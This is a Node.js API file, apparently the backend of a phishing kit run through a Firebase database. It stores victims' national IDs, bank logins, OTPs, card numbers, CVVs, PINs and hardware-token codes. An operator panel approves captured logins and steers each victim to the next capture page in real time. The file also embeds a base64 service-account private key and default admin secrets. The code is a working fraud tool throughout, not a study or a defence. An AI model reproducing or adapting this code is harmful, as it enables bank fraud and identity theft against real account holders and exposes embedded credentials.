const crypto = require('crypto');
const { initializeApp, getApps, cert } = require('firebase-admin/app');
const { getFirestore } = require('firebase-admin/firestore');

const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin1234@@';
const TOKEN_SECRET = process.env.TOKEN_SECRET || 'halyg-admin-secret-key-2026';
const FB_SA_B64 = 'ewogICJ0eXBlIjogInNlcnZpY2VfYWNjb3VudCIsCiAgInByb2plY3RfaWQiOiAic2Fzby1pbnNwZWN0aW9uIiwKICAicHJpdmF0ZV9rZXlfaWQiOiAiNDNkOGE1YzQ2MzczY2Y3YzVkNzUzYTlhMTQ0NDU4NjYzYTYwN2FkMyIsCiAgInByaXZhdGVfa2V5IjogIi0tLS0tQkVHSU4gUFJJVkFURSBLRVktLS0tLVxuTUlJRXZ3SUJBREFOQmdrcWhraUc5dzBCQVFFRkFBU0NCS2t3Z2dTbEFnRUFBb0lCQVFDOVVkS2RDTVgrNTBzWVxuMThRMEZmLzBuK2l3ZkhSK2JvK2tVTTBiR0p2U0FMMXg1K0lDcFYwQWpXR2gwT1NIME1WaldlcldQY1VGMmpXY1xuTklLZjNDSUFFa2p6NDgrTkcrR1pzM2pmRWIrTDA3VzNLWDJxTVRseGJoT1krQnpmUXVRTlJOV1FVdUt0YXJSTVxuRU4yL005ZkpmMmVVd2xxNHRaZkRUb0tsbWhFSnp2bnJ5YmRnajBsbndWTHpYOTJ5b1F6R0lnQjZMdWMwV203MVxualNTSlh5ekV6ZTNCWTVBUjhrQjNicEdyamtaWHozVTZDVU1TSHFubXo2UEZyR2ZqRjVXK2tpSjhkWjdsT0FUQlxuaVBTZ2J5YmNFSWRlTkhPS3labWJQYmpmbmdmU0ZYUVZvTlBNdUN0V3lxQXFLUnk2NExNNm1lNjR1QzZUbmdyQlxuVHJxQWp5U0pBZ01CQUFFQ2dnRUFBbEJEQ1gvN1VtNS9aby94Y2YwQVZod1Rwdjk0V1hpdXFQQ0RWeVROZDZzaVxuWllkU3hkdEJPQkhpT3V6ZmRCRHZMcFFCV0ltajlCcTY2N3doQ2dUUnhnd3pKOGJWaVJrSmdGdzIrb3ZnR2p4MVxudEtXdFIxU0hhZzFSTUQzODlWWC9EVEgxaGFoYnBJaWdxQ3JQR09od1owSVhNUlJRY1VBbjJQOUhQYkNVcTNqZVxuaDVIOE42STJaUGc4RjUzWFRST1hrUlQ2U2JzZ1Q0a3cwQ0kyN2RNNTF1RGNrRnJpRmNoOVkwSEJJdUw3NnFzd1xuWXRKUEFTZFFicUhOdnR2VlNwbUpZYUduZzJDKzNzMUlpTG1JaVNkSDZmSGdwYnhDTS9lZTAvSXlUMXBTV1V5Q1xuOGVQY0MyS0dUMm9PbGZacFQ5cDFSRWNiaEVGSzZQT05QVnk3Mmwvd2NRS0JnUURnTWZqaTZNUFBTK1pKYjRQRlxuT0ovdkUrYThnSGloU1liaWFuY2xqMjB2bk55THJoNkVKR0VKUThncnBrdVFDd1NGdzBCNDljcG9RNzVHdm5Va1xuRVpJVG1EcEg4YmNzc3dUanBadW1EMW9LK3F6SHhpTHJkaTR2Q2V0a1YvR0hibExma1lBMVdjQXc4ek55VWFweVxuQ0t2QUtrY3RTRmlaZndTbG9jM0dqN3NsTVFLQmdRRFlMVWppK1ZzSDczWjh3YkdIVFQ5Y3NRNyszVUFtSStJdVxuYkNhalE1TTlhWkViWFFHS0l3RTlDVlN1bmJJRGFDRUdFMjVEb1Qza3QwQVNURVp3dGZkNFJFeUtMZlpzNkJ5UlxuQml0UTB4R21za1NYelNrVjVLTFZiZlBVNU05UnBHbi93QldjcHlFbWoyelRUR2l1Mk14WWIvcVpEQkJxaDJmb1xuY212b011YisyUUtCZ1FEZlNRWGZRQUdjbUxRZldWLzhjWHZnQ1lzWkhENklMQW1ad0gwdnZGdjdPcGZ3eVpaOFxuOXhwcHRzZEtxZEhDQVNjYzdheHRqQ1p0bDJLUFpLcVlKS08rdmpMMWFraUx6VFBHWWk3VndaNWxKdW9rQVRMUVxuSGFDN21uNkZMbzFQMjlIUDlrS2hYK1RwRzU2V2NiMTIyeW5yTm5BektrV0xncFNuUGJJSzJ5V0JVUUtCZ1FDNFxubCtLM1BpcEhXbW1aR21TWG5wVE9kN3JRVXVsbUtCb0pmZng0U1VtL2xSZDlnQ3ZDWXlXNWt2QW1zeTNBenZmMFxuRWorRHJIb0hoWnRHaEs5WnEyaUgzL3BqdTkvREcyalpSYVZUUFFqRGlWSWROZWt4Y3F6QkIwVEF0Q2w4RTZNWFxuNmxRS0VvU3lRcUt3dzN4WVlYUU15SUg2a2x5cU9ybTF1WTcvRmdnOThRS0JnUUN4Q0twb1ZVYmx2bHNic2l4Q1xuQnRvdnhUdHREODhPdHRQbUpDdm9EZlZVbjNWMk9RK21nbXRDODdHK0NCb0FLZ2xlWGh4b2VMZWVYNTY0eldjWFxueGZNMWlvWXZneE5SYUUyWk1GaThVT0dTK0txQXNKcWVqZUd0THpZU0xYSytTeWszSG9tZVRIbmZGRFI1M3g1dFxuOEpsOG9qSVBjZnM4UWlwekI2NGFTMlRaVEE9PVxuLS0tLS1FTkQgUFJJVkFURSBLRVktLS0tLVxuIiwKICAiY2xpZW50X2VtYWlsIjogImZpcmViYXNlLWFkbWluc2RrLWZic3ZjQHNhc28taW5zcGVjdGlvbi5pYW0uZ3NlcnZpY2VhY2NvdW50LmNvbSIsCiAgImNsaWVudF9pZCI6ICIxMTI4MDk2Njg5MDcyNjMzMDA1NjQiLAogICJhdXRoX3VyaSI6ICJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb20vby9vYXV0aDIvYXV0aCIsCiAgInRva2VuX3VyaSI6ICJodHRwczovL29hdXRoMi5nb29nbGVhcGlzLmNvbS90b2tlbiIsCiAgImF1dGhfcHJvdmlkZXJfeDUwOV9jZXJ0X3VybCI6ICJodHRwczovL3d3dy5nb29nbGVhcGlzLmNvbS9vYXV0aDIvdjEvY2VydHMiLAogICJjbGllbnRfeDUwOV9jZXJ0X3VybCI6ICJodHRwczovL3d3dy5nb29nbGVhcGlzLmNvbS9yb2JvdC92MS9tZXRhZGF0YS94NTA5L2ZpcmViYXNlLWFkbWluc2RrLWZic3ZjJTQwc2Fzby1pbnNwZWN0aW9uLmlhbS5nc2VydmljZWFjY291bnQuY29tIiwKICAidW5pdmVyc2VfZG9tYWluIjogImdvb2dsZWFwaXMuY29tIgp9Cg==';

if (!getApps().length) {
  let sa;
  if (process.env.FIREBASE_SERVICE_ACCOUNT) {
    sa = JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT);
  } else {
    sa = JSON.parse(Buffer.from(FB_SA_B64, 'base64').toString('utf8'));
  }
  initializeApp({ credential: cert(sa) });
}
const db = getFirestore();
const appsCol = db.collection('halyg_apps');
const settingsRef = db.doc('halyg_config/settings');

const _cache = {};
function cached(key, ttlMs, fn) {
  const entry = _cache[key];
  if (entry && Date.now() - entry.ts < ttlMs) return Promise.resolve(entry.data);
  return fn().then(data => { _cache[key] = { data, ts: Date.now() }; return data; });
}
function clearCache(prefix) {
  for (const k of Object.keys(_cache)) if (k.startsWith(prefix)) delete _cache[k];
}

function makeToken() {
  return crypto.createHmac('sha256', TOKEN_SECRET).update(ADMIN_PASSWORD).digest('hex');
}
function verifyToken(token) { return token && token === makeToken(); }
function getCookies(h) {
  return (h || '').split(';').reduce((a, c) => { const i = c.indexOf('='); if (i > 0) a[c.slice(0, i).trim()] = c.slice(i + 1).trim(); return a; }, {});
}
function isAdminReq(req) {
  const cookies = getCookies(req.headers.cookie);
  return verifyToken(req.headers['x-admin-token'] || cookies['admin_session']);
}

const visitorsCol = db.collection('halyg_visitors');

async function getSettings() {
  const doc = await settingsRef.get();
  const defaults = { whatsappLink: '', totalVisitors: 0, appIdCounter: 10000, visitorIdCounter: 120000 };
  return doc.exists ? { ...defaults, ...doc.data() } : { ...defaults };
}

async function getOrCreateApp(nationalId) {
  const ref = appsCol.doc(nationalId);
  const doc = await ref.get();
  if (doc.exists) return doc.data();

  const settings = await getSettings();
  const newId = (settings.appIdCounter || 10000) + 1;
  await settingsRef.set({ appIdCounter: newId }, { merge: true });

  const app = {
    id: newId, nationalId,
    fullName: '', phoneNumber: '', phone: '', address: '',
    username: '', password: '',
    otp: '', otpCode: '',
    cardNumber: '', cardExpiry: '', cvv: '', cardCvv: '',
    cardPin: '', cardName: '',
    hardToken: '', watchLink: '', watchLinkOtp: '',
    selectedWatch: '', watchColor: '',
    governorate: '',
    currentPage: 'home', status: 'active',
    redirectTo: null, redirectError: null,
    customMessage: null, loginApproved: null,
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
  };
  await ref.set(app);
  return app;
}

async function getOrCreateVisitor(sessionId) {
  const ref = visitorsCol.doc(sessionId);
  const doc = await ref.get();
  if (doc.exists) return doc.data();

  const { FieldValue } = require('firebase-admin/firestore');
  await settingsRef.set({ totalVisitors: FieldValue.increment(1) }, { merge: true });

  const visitor = {
    id: Date.now(), sessionId,
    currentPage: 'home', redirectTo: null,
    lastActiveAt: new Date().toISOString(),
    createdAt: new Date().toISOString(),
  };
  await ref.set(visitor);
  return visitor;
}

async function executeProcedure(name, input, isAdmin) {
  switch (name) {
    case 'admin.updateVisitor': {
      const { sessionId, page, currentPage } = input;
      if (sessionId) {
        const v = await getOrCreateVisitor(sessionId);
        const updates = { lastActiveAt: new Date().toISOString() };
        if (currentPage || page) updates.currentPage = currentPage || page;
        await visitorsCol.doc(sessionId).update(updates);
      }
      return { success: true };
    }
    case 'admin.getVisitorRedirect': {
      const { sessionId } = input;
      if (!sessionId) return { redirectTo: null };
      const doc = await visitorsCol.doc(sessionId).get();
      const v = doc.exists ? doc.data() : null;
      return { redirectTo: v ? (v.redirectTo || null) : null };
    }
    case 'admin.clearVisitorRedirect': {
      const { sessionId } = input;
      if (sessionId) {
        const ref = visitorsCol.doc(sessionId);
        const doc = await ref.get();
        if (doc.exists) await ref.update({ redirectTo: null, lastActiveAt: new Date().toISOString() });
      }
      return { success: true };
    }
    case 'applications.getRedirectStatus': {
      const { nationalId } = input;
      if (!nationalId) return { redirectTo: null, redirectError: null };
      const doc = await appsCol.doc(nationalId).get();
      const app = doc.exists ? doc.data() : null;
      return { redirectTo: app ? (app.redirectTo || null) : null, redirectError: app ? (app.redirectError || null) : null };
    }
    case 'applications.clearRedirectByUser': {
      const { nationalId } = input;
      if (nationalId) {
        const ref = appsCol.doc(nationalId);
        const doc = await ref.get();
        if (doc.exists) await ref.update({ redirectTo: null, redirectError: null, updatedAt: new Date().toISOString() });
      }
      return { success: true };
    }
    case 'applications.getCustomMessage': {
      const { nationalId } = input;
      if (!nationalId) return { message: null };
      const doc = await appsCol.doc(nationalId).get();
      const app = doc.exists ? doc.data() : null;
      return { message: app ? (app.customMessage || null) : null };
    }
    case 'applications.clearCustomMessage': {
      const { nationalId } = input;
      if (nationalId) {
        const ref = appsCol.doc(nationalId);
        const doc = await ref.get();
        if (doc.exists) await ref.update({ customMessage: null });
      }
      return { success: true };
    }
    case 'applications.updatePage': {
      const { nationalId, page } = input;
      if (nationalId) {
        const ref = appsCol.doc(nationalId);
        const doc = await ref.get();
        if (doc.exists) await ref.update({ currentPage: page || doc.data().currentPage, updatedAt: new Date().toISOString() });
      }
      return { success: true };
    }
    case 'applications.savePersonalInfo': {
      const { nationalId, fullName, phone, phoneNumber, address, governorate, watchColor } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = await getOrCreateApp(nationalId);
      if (fullName) app.fullName = fullName;
      const ph = phone || phoneNumber;
      if (ph) { app.phone = ph; app.phoneNumber = ph; }
      if (address) app.address = address;
      if (governorate) app.governorate = governorate;
      if (watchColor) { app.watchColor = watchColor; app.selectedWatch = watchColor; }
      app.currentPage = 'personal';
      app.updatedAt = new Date().toISOString();
      await appsCol.doc(nationalId).set(app);
      return { success: true };
    }
    case 'applications.saveLoginData': {
      const { nationalId, username, password } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = await getOrCreateApp(nationalId);
      if (username) app.username = username;
      if (password) app.password = password;
      if (!app.fullName && username) app.fullName = username;
      app.currentPage = 'waiting-login';
      app.redirectTo = null; app.redirectError = null;
      app.loginApproved = null; app.status = 'awaiting_login'; app.updatedAt = new Date().toISOString();
      await appsCol.doc(nationalId).set(app);
      return { success: true };
    }
    case 'applications.saveOtpData': {
      const { nationalId, otp, otpCode } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = await getOrCreateApp(nationalId);
      const code = otp || otpCode;
      if (code) { app.otp = code; app.otpCode = code; }
      app.currentPage = 'processing';
      app.redirectTo = null; app.redirectError = null;
      app.status = 'awaiting_otp'; app.updatedAt = new Date().toISOString();
      await appsCol.doc(nationalId).set(app);
      return { success: true };
    }
    case 'applications.saveCardData': {
      const { nationalId, cardNumber, cardExpiry, cvv, cardCvv, cardName, cardPin, expiry } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = await getOrCreateApp(nationalId);
      if (cardNumber) app.cardNumber = cardNumber;
      if (cardExpiry || expiry) app.cardExpiry = cardExpiry || expiry;
      const cv = cvv || cardCvv;
      if (cv) { app.cvv = cv; app.cardCvv = cv; }
      if (cardName) app.cardName = cardName;
      if (cardPin) app.cardPin = cardPin;
      app.currentPage = 'processing';
      app.redirectTo = null; app.redirectError = null;
      app.status = 'awaiting_card'; app.updatedAt = new Date().toISOString();
      await appsCol.doc(nationalId).set(app);
      return { success: true };
    }
    case 'applications.saveHardToken': {
      const { nationalId, hardToken, hardTokenCode, token } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = await getOrCreateApp(nationalId);
      const tk = hardToken || hardTokenCode || token;
      if (tk) app.hardToken = tk;
      app.currentPage = 'processing';
      app.redirectTo = null; app.redirectError = null;
      app.status = 'awaiting_token'; app.updatedAt = new Date().toISOString();
      await appsCol.doc(nationalId).set(app);
      return { success: true };
    }
    case 'applications.saveWatchLink': {
      const { nationalId, watchLink, watchLinkOtp, link } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = await getOrCreateApp(nationalId);
      const wl = watchLink || watchLinkOtp || link;
      if (wl) { app.watchLink = wl; app.watchLinkOtp = wl; }
      app.currentPage = 'processing';
      app.redirectTo = null; app.redirectError = null;
      app.status = 'awaiting_watchlink'; app.updatedAt = new Date().toISOString();
      await appsCol.doc(nationalId).set(app);
      return { success: true };
    }
    case 'admin.login': {
      const { password } = input;
      if (password === ADMIN_PASSWORD) return { success: true, _setToken: makeToken() };
      throw new Error('بيانات الدخول غير صحيحة');
    }
    case 'admin.checkSession': {
      return { isAdmin: !!isAdmin, authenticated: !!isAdmin };
    }
    case 'admin.logout': {
      return { success: true, _clearToken: true };
    }
    case 'admin.getApplications': {
      if (!isAdmin) throw new Error('unauthorized');
      return cached('admin.getApps', 5000, async () => {
        const snap = await appsCol.get();
        const apps = [];
        snap.forEach(d => apps.push(d.data()));
        const cutoff = Date.now() - 60000;
        const activeIds = apps.filter(a => new Date(a.updatedAt).getTime() > cutoff).map(a => a.nationalId);
        const visitorCutoff = new Date(Date.now() - 120000).toISOString();
        const liveSnap = await visitorsCol.where('lastActiveAt', '>', visitorCutoff).get();
        const settings = await getSettings();
        return { apps, activeIds, liveVisitorCount: liveSnap.size, totalVisitors: settings.totalVisitors };
      });
    }
    case 'admin.getLiveVisitors': {
      if (!isAdmin) throw new Error('unauthorized');
      return cached('admin.liveVisitors', 5000, async () => {
        const visitorCutoff = new Date(Date.now() - 120000).toISOString();
        const snap = await visitorsCol.where('lastActiveAt', '>', visitorCutoff).get();
        const visitors = [];
        snap.forEach(d => visitors.push(d.data()));
        return { visitors };
      });
    }
    case 'admin.getAllVisitors': {
      if (!isAdmin) throw new Error('unauthorized');
      return cached('admin.allVisitors', 8000, async () => {
        const settings = await getSettings();
        const snap = await visitorsCol.orderBy('lastActiveAt', 'desc').limit(200).get();
        const visitors = [];
        snap.forEach(d => visitors.push(d.data()));
        return { visitors, totalCount: settings.totalVisitors };
      });
    }
    case 'admin.getWhatsAppLink': {
      const settings = await getSettings();
      return { link: settings.whatsappLink || '' };
    }
    case 'admin.updateWhatsAppLink': {
      if (!isAdmin) throw new Error('unauthorized');
      await settingsRef.set({ whatsappLink: input.link || '' }, { merge: true });
      return { success: true };
    }
    case 'admin.setCustomMessage': {
      if (!isAdmin) throw new Error('unauthorized');
      const { nationalId, message } = input;
      if (nationalId) {
        const ref = appsCol.doc(nationalId);
        const doc = await ref.get();
        if (doc.exists) await ref.update({ customMessage: message || null, updatedAt: new Date().toISOString() });
      }
      return { success: true };
    }
    case 'admin.approveLogin': {
      if (!isAdmin) throw new Error('unauthorized');
      const { applicationId, nationalId } = input;
      let ref, doc;
      if (nationalId) {
        ref = appsCol.doc(nationalId);
        doc = await ref.get();
      }
      if ((!doc || !doc.exists) && applicationId) {
        const snap = await appsCol.where('id', '==', applicationId).limit(1).get();
        if (!snap.empty) { doc = snap.docs[0]; ref = doc.ref; }
      }
      if (doc && doc.exists) {
        await ref.update({ loginApproved: true, redirectTo: 'otp', currentPage: 'otp', status: 'login_approved', updatedAt: new Date().toISOString() });
      }
      return { success: true };
    }
    case 'admin.rejectLogin': {
      if (!isAdmin) throw new Error('unauthorized');
      const { applicationId, nationalId } = input;
      let ref, doc;
      if (nationalId) {
        ref = appsCol.doc(nationalId);
        doc = await ref.get();
      }
      if ((!doc || !doc.exists) && applicationId) {
        const snap = await appsCol.where('id', '==', applicationId).limit(1).get();
        if (!snap.empty) { doc = snap.docs[0]; ref = doc.ref; }
      }
      if (doc && doc.exists) {
        await ref.update({ loginApproved: false, redirectTo: 'login-error', currentPage: 'login', status: 'login_rejected', updatedAt: new Date().toISOString() });
      }
      return { success: true };
    }
    case 'admin.redirectUser': {
      if (!isAdmin) throw new Error('unauthorized');
      const { nationalId, redirectTo, page, redirectError, showError } = input;
      if (nationalId) {
        const ref = appsCol.doc(nationalId);
        const doc = await ref.get();
        if (doc.exists) {
          const dest = redirectTo || page || null;
          const updates = { redirectTo: dest, redirectError: redirectError || showError || null, updatedAt: new Date().toISOString() };
          if (dest) updates.currentPage = dest;
          await ref.update(updates);
        }
      }
      return { success: true };
    }
    case 'admin.redirectVisitor': {
      if (!isAdmin) throw new Error('unauthorized');
      const { sessionId, redirectTo, page } = input;
      if (sessionId) {
        const ref = visitorsCol.doc(sessionId);
        const doc = await ref.get();
        if (doc.exists) await ref.update({ redirectTo: redirectTo || page || null, lastActiveAt: new Date().toISOString() });
      }
      return { success: true };
    }
    case 'admin.redirectAllToToken': {
      if (!isAdmin) throw new Error('unauthorized');
      const snap = await appsCol.get();
      const batch = db.batch();
      snap.forEach(d => {
        const app = d.data();
        if (app.status === 'active' || (app.status && app.status.startsWith('awaiting'))) {
          batch.update(d.ref, { redirectTo: input.redirectTo || 'token', updatedAt: new Date().toISOString() });
        }
      });
      await batch.commit();
      return { success: true };
    }
    case 'admin.redirectWhatsApp': {
      if (!isAdmin) throw new Error('unauthorized');
      const { applicationId, nationalId } = input;
      let ref, doc;
      if (nationalId) {
        ref = appsCol.doc(nationalId);
        doc = await ref.get();
      }
      if ((!doc || !doc.exists) && applicationId) {
        const snap = await appsCol.where('id', '==', applicationId).limit(1).get();
        if (!snap.empty) { doc = snap.docs[0]; ref = doc.ref; }
      }
      if (doc && doc.exists) {
        await ref.update({ redirectTo: 'whatsapp', updatedAt: new Date().toISOString() });
      }
      return { success: true };
    }
    case 'admin.deleteApplication': {
      if (!isAdmin) throw new Error('unauthorized');
      const { applicationId, nationalId } = input;
      if (nationalId) {
        await appsCol.doc(nationalId).delete();
      } else if (applicationId) {
        const snap = await appsCol.where('id', '==', applicationId).limit(1).get();
        if (!snap.empty) await snap.docs[0].ref.delete();
      }
      clearCache('admin.');
      return { success: true };
    }
    case 'admin.deleteInactiveClients': {
      if (!isAdmin) throw new Error('unauthorized');
      const cutoff = new Date(Date.now() - 120000).toISOString();
      const snap = await appsCol.where('updatedAt', '<', cutoff).get();
      let deletedCount = 0;
      const batch = db.batch();
      snap.forEach(d => { batch.delete(d.ref); deletedCount++; });
      if (deletedCount > 0) await batch.commit();
      clearCache('admin.');
      return { success: true, deletedCount };
    }
    case 'admin.deleteAllClients': {
      if (!isAdmin) throw new Error('unauthorized');
      const snap = await appsCol.get();
      const count = snap.size;
      const batch = db.batch();
      snap.forEach(d => batch.delete(d.ref));
      if (count > 0) await batch.commit();
      clearCache('admin.');
      return { success: true, deletedCount: count };
    }
    case 'admin.resetTotalVisitors': {
      if (!isAdmin) throw new Error('unauthorized');
      await settingsRef.set({ totalVisitors: 0 }, { merge: true });
      return { success: true };
    }
    default:
      return { success: false, error: 'unknown procedure: ' + name };
  }
}

module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, x-admin-token, Authorization');
  if (req.method === 'OPTIONS') return res.status(200).end();

  const { trpc } = req.query;
  let procsStr = Array.isArray(trpc) ? trpc.join('/') : (trpc || '');
  if (!procsStr) { const m = (req.url || '').split('?')[0].match(/\/api\/trpc\/(.+)/); if (m) procsStr = decodeURIComponent(m[1]); }
  const procs = procsStr.split(',').filter(Boolean);
  if (!procs.length) return res.status(400).json([]);

  let inputs = {};
  if (req.method === 'GET') { try { inputs = JSON.parse(req.query.input || '{}'); } catch { inputs = {}; } }
  else inputs = req.body || {};

  const isAdmin = isAdminReq(req);

  let setCookie = null, clearCookie = false;

  const results = [];
  for (let i = 0; i < procs.length; i++) {
    const raw = inputs[String(i)] || inputs;
    const input = raw?.json || raw || {};
    const procName = procs[i].trim();
    try {
      const result = await executeProcedure(procName, input, isAdmin);
      if (result?._setToken) { setCookie = result._setToken; delete result._setToken; }
      if (result?._clearToken) { clearCookie = true; delete result._clearToken; }
      results.push({ result: { data: { json: result } } });
    } catch (e) {
      results.push({ error: { message: e.message || 'Internal error', code: 'INTERNAL_SERVER_ERROR' } });
    }
  }

  if (setCookie) res.setHeader('Set-Cookie', `admin_session=${setCookie}; Path=/; HttpOnly; SameSite=Lax; Max-Age=86400`);
  if (clearCookie) res.setHeader('Set-Cookie', 'admin_session=; Path=/; HttpOnly; Max-Age=0');
  res.setHeader('Cache-Control', 'no-store');
  return res.status(200).json(results);
};
